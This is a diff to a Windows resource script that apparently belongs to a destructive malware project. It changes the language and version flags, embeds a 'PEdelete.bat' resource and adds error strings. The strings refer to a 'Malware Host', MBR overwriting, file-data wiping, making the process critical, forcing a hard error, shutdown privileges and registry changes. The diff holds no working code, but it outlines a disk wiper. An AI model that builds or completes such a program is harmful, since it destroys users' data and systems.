@@ -15,10 +15,10 @@
 #undef APSTUDIO_READONLY_SYMBOLS
 
 /////////////////////////////////////////////////////////////////////////////
-// German (Germany) resources
+// English (United States) resources
 
-#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_DEU)
-LANGUAGE LANG_GERMAN, SUBLANG_GERMAN
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
 
 #ifdef APSTUDIO_INVOKED
 /////////////////////////////////////////////////////////////////////////////
@@ -45,15 +45,6 @@ END
 
 #endif    // APSTUDIO_INVOKED
 
-#endif    // German (Germany) resources
-/////////////////////////////////////////////////////////////////////////////
-
-
-/////////////////////////////////////////////////////////////////////////////
-// English (United States) resources
-
-#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
-LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
 
 /////////////////////////////////////////////////////////////////////////////
 //
@@ -65,12 +56,12 @@ VS_VERSION_INFO VERSIONINFO
  PRODUCTVERSION 86,0,5,2
  FILEFLAGSMASK 0x3fL
 #ifdef _DEBUG
- FILEFLAGS 0x1L
+ FILEFLAGS 0x3L
 #else
- FILEFLAGS 0x0L
+ FILEFLAGS 0x2L
 #endif
  FILEOS 0x40004L
- FILETYPE 0x0L
+ FILETYPE 0x1L
  FILESUBTYPE 0x0L
 BEGIN
     BLOCK "StringFileInfo"
@@ -98,7 +89,68 @@ END
 // RT_RCDATA
 //
 
-IDR_RCDATA_0x01         RT_RCDATA               "PEdelete.bat"
+IDR_RCDATA101           RT_RCDATA               "PEdelete.bat"
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// String Table
+//
+
+STRINGTABLE
+BEGIN
+    IDS_STRING101           "Couldn't parse Commandline"
+    IDS_STRING102           "Couldn't copy current Module to target Path\nModule: %s\nTarget: %s"
+    IDS_STRING103           "Couldn't set File Attributes"
+    IDS_STRING104           "Couldn't generate Random Buffer Content\nusing ZeroMemory instead"
+    IDS_STRING105           "Couldn't overwrite FileData"
+    IDS_STRING106           "Couldn't allocate Buffer"
+    IDS_STRING107           "Couldn't open existing File\n File: %s"
+    IDS_STRING108           "Process isn't Administrator"
+    IDS_STRING109           "Couldn't set Malware Host to High Priority\nRunning with Normal Priority"
+    IDS_STRING110           "Malware Host is already running\n(Mutex already exist)"
+    IDS_STRING111           "Couldn't create /host Mutex"
+END
+
+STRINGTABLE
+BEGIN
+    IDS_STRING112           "Malware Host failed to launch"
+    IDS_STRING113           "Couldn't open Check-File"
+    IDS_STRING114           "Couldn't format Warning-Message"
+    IDS_STRING115           "Couldn't allocate Buffer in Heap"
+    IDS_STRING116           "Couldn't copy Binary to target Path\nFile: %s\nPath: %s"
+    IDS_STRING117           "Directory already exist\nPath: %s"
+    IDS_STRING118           "Couldn't create target Directory\nPath: %s"
+    IDS_STRING119           "Couldn't determin Drive type\nPath: %s"
+    IDS_STRING120           "Couldn't enumerate Drives"
+    IDS_STRING121           "Couldn't open Handle ""hFind"" to FirstFile\nFile: %s"
+    IDS_STRING122           "Couldn't overwrite MBR"
+    IDS_STRING123           "Couldn't open Handle ""hMbr"" to MBR"
+    IDS_STRING124           "Failed to Generate Random Buffer"
+END
+
+STRINGTABLE
+BEGIN
+    IDS_STRING131           "Failed to raise HardError"
+    IDS_STRING132           "Couldn't set Shutdwon Privileges"
+    IDS_STRING133           "Couldn't set Process Critical"
+    IDS_STRING134           "Couldn't set Debug Privileges"
+    IDS_STRING135           "Couldn't open Registry Key"
+    IDS_STRING136           "Couldn't set Registry Type/Value\nType: %d\nValue: %s 0x%X"
+    IDS_STRING137           "Couldn't create Registry Key\nKey: %s"
+    IDS_STRING138           "Couldn't lock Resource"
+    IDS_STRING139           "Couldn't get size of Resource"
+    IDS_STRING140           "Couldn't load Resource"
+    IDS_STRING141           "Couldn't find Resource\nResourceID: %d\nResourceType: %s"
+    IDS_STRING142           "Couldn't write Buffer to File"
+    IDS_STRING143           "Couldn't create File\nFile: %s"
+END
+
+STRINGTABLE
+BEGIN
+    IDS_STRING144           "Couldn't create Heap"
+    IDS_STRING145           "Couldn't Open Mutex"
+END
 
 #endif    // English (United States) resources
 /////////////////////////////////////////////////////////////////////////////
